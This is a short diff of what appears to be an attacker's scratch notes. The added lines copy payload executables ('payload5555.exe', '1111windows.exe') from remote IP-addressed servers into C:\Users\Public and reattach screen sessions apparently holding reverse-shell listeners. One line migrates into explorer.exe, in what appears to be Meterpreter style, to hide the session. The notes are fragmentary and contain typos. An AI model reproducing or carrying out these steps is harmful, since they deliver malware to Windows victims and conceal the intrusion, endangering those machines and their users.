@@ -1,10 +1,24 @@
-jscp root@146.190.83.1:payload5555.exe C:\Users\Public
+scp root@146.190.83.1:payload5555.exe C:\Users\Public
 screen -r windows4444
 screen -r windows5555
 
 
 ps | grep explorer.exe
 migrate id exploler
+
+
+
+akun 2
+
+
+scp root@167.172.70.134:1111windows.exe C:\Users\Public
+2222windows
+
+
+
+scree
+Screen -r windows2222
+screen -r windows1111
 
 
 
